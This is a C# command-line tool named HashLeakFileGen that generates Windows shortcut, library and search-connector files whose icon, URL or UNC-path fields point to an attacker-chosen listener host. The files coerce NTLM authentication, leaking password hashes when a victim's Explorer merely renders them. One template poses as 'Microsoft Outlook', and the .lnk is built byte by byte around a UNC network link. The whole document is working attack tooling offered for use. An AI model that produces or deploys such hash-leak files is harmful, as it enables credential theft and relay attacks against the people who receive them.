using System.CommandLine;
using System.Text;

namespace HashLeakFileGen
{
    internal class Program
    {
        static int Main(string[] args)
        {
            var listener = new Option<string>("--listener", "-l")
            {
                Description = "IP address or hostname of the listener machine",
                Required = true,
                //DefaultValueFactory = _ => "127.0.0.1",
            };

            var filename = new Option<string>("--filename", "-o")
            {
                Description = "File name of the hash leak files",
                Required = true,
                //DefaultValueFactory = _ => "hashleak",
            };

            var root = new RootCommand("""
                HashLeakFileGen

                Supports:
                .url                – via URL/IconFile field
                .lnk                - via icon_location field
                .searchConnector-ms - via iconReference/url field
                .library-ms         - via url field
                """);
            root.Options.Add(listener);
            root.Options.Add(filename);

            root.SetAction(parseResult =>
            {
                FileGen(parseResult.GetValue(listener), parseResult.GetValue(filename));
            });

            return root.Parse(args).Invoke();
        }

        static void FileGen(string listener, string filename)
        {
            Console.WriteLine($"Listener: {listener}");
            Console.WriteLine($"Filename: {filename}");

            var files = new List<(string Extension, string Content)>
            {
                (".url", $$"""
                    [InternetShortcut]
                    URL=http://{{listener}}/login
                    WorkingDirectory=default
                    IconFile={{listener}}\\ico.icon
                    IconIndex=1
                    """),

                (".searchConnector-ms", $$"""
                    <?xml version="1.0" encoding="UTF-8"?>
                    <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
                        <iconReference>imageres.dll,-1002</iconReference>
                        <description>Microsoft Outlook</description>
                        <isSearchOnlyItem>false</isSearchOnlyItem>
                        <includeInStartMenuScope>true</includeInStartMenuScope>
                        <iconReference>{{listener}}</iconReference>
                        <templateInfo>
                            <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
                        </templateInfo>
                        <simpleLocation>
                            <url>{{listener}}</url>
                        </simpleLocation>
                    </searchConnectorDescription>
                    """),

                (".library-ms", $$"""
                    <?xml version="1.0" encoding="UTF-8"?>
                    <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
                      <name>@windows.storage.dll,-34582</name>
                      <version>6</version>
                      <isLibraryPinned>true</isLibraryPinned>
                      <iconReference>imageres.dll,-1003</iconReference>
                      <templateInfo>
                        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
                      </templateInfo>
                      <searchConnectorDescriptionList>
                        <searchConnectorDescription>
                          <isDefaultSaveLocation>true</isDefaultSaveLocation>
                          <isSupported>false</isSupported>
                          <simpleLocation>
                            <url>{{listener}}</url>
                          </simpleLocation>
                        </searchConnectorDescription>
                      </searchConnectorDescriptionList>
                    </libraryDescription>
                    """),
            };

            var binaryFiles = new List<(string Extension, byte[] Content)>
            {
                (".lnk", CreateUncLnk($@"\\{listener}\share")),
            };

            foreach (var (extension, content) in files)
            {
                var outputPath = $"{filename}{extension}";
                File.WriteAllText(outputPath, content);
                Console.WriteLine($"Written: {outputPath}");
            }

            foreach (var (extension, content) in binaryFiles)
            {
                var outputPath = $"{filename}{extension}";
                File.WriteAllBytes(outputPath, content);
                Console.WriteLine($"Written: {outputPath}");
            }
        }

        static byte[] CreateUncLnk(string uncPath)
        {
            var result = new List<byte>();

            // --- Shell Link Header (76 bytes) ---
            result.AddRange(BitConverter.GetBytes(0x4C));                           // HeaderSize
            result.AddRange(new byte[] {                                            // LinkCLSID
                0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,
                0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46
            });
            result.AddRange(BitConverter.GetBytes(0x0000010B));                     // LinkFlags
            result.AddRange(BitConverter.GetBytes(0x00000020));                     // FileAttributes
            result.AddRange(new byte[24]);                                          // 3x FILETIME
            result.AddRange(BitConverter.GetBytes(0));                              // FileSize
            result.AddRange(BitConverter.GetBytes(0));                              // IconIndex
            result.AddRange(BitConverter.GetBytes(1));                              // ShowCommand
            result.AddRange(BitConverter.GetBytes((short)0));                       // HotKey
            result.AddRange(new byte[10]);                                          // Reserved

            // --- IDList (minimal empty) ---
            var idList = BitConverter.GetBytes((short)0);                           // Terminator
            result.AddRange(BitConverter.GetBytes((short)idList.Length));
            result.AddRange(idList);

            // --- CommonNetworkRelativeLink ---
            var netName = Encoding.ASCII.GetBytes(uncPath + "\0");
            var cnrl = new List<byte>();
            cnrl.AddRange(new byte[4]);                                             // Size placeholder
            cnrl.AddRange(BitConverter.GetBytes(0x00000000));                       // Flags
            cnrl.AddRange(BitConverter.GetBytes(20));                               // NetNameOffset
            cnrl.AddRange(BitConverter.GetBytes(0));                                // DeviceNameOffset
            cnrl.AddRange(BitConverter.GetBytes(0));                                // NetworkProviderType
            cnrl.AddRange(netName);
            var cnrlSize = BitConverter.GetBytes(cnrl.Count);
            cnrl[0] = cnrlSize[0]; cnrl[1] = cnrlSize[1];
            cnrl[2] = cnrlSize[2]; cnrl[3] = cnrlSize[3];

            // --- LinkInfo ---
            const int linkInfoHeaderSize = 28;
            int cnrlOffset = linkInfoHeaderSize;
            int pathSuffixOffset = cnrlOffset + cnrl.Count;
            byte[] pathSuffix = [0x00];

            var linkInfo = new List<byte>();
            linkInfo.AddRange(new byte[4]);                                         // Size placeholder
            linkInfo.AddRange(BitConverter.GetBytes(linkInfoHeaderSize));           // HeaderSize
            linkInfo.AddRange(BitConverter.GetBytes(0x00000002));                   // Flags: CommonNetworkRelativeLink
            linkInfo.AddRange(BitConverter.GetBytes(0));                            // VolumeIDOffset
            linkInfo.AddRange(BitConverter.GetBytes(0));                            // LocalBasePathOffset
            linkInfo.AddRange(BitConverter.GetBytes(cnrlOffset));                   // CommonNetworkRelativeLinkOffset
            linkInfo.AddRange(BitConverter.GetBytes(pathSuffixOffset));             // CommonPathSuffixOffset
            linkInfo.AddRange(cnrl);
            linkInfo.AddRange(pathSuffix);
            var linkInfoSize = BitConverter.GetBytes(linkInfo.Count);
            linkInfo[0] = linkInfoSize[0]; linkInfo[1] = linkInfoSize[1];
            linkInfo[2] = linkInfoSize[2]; linkInfo[3] = linkInfoSize[3];

            result.AddRange(linkInfo);

            return result.ToArray();
        }

    }
}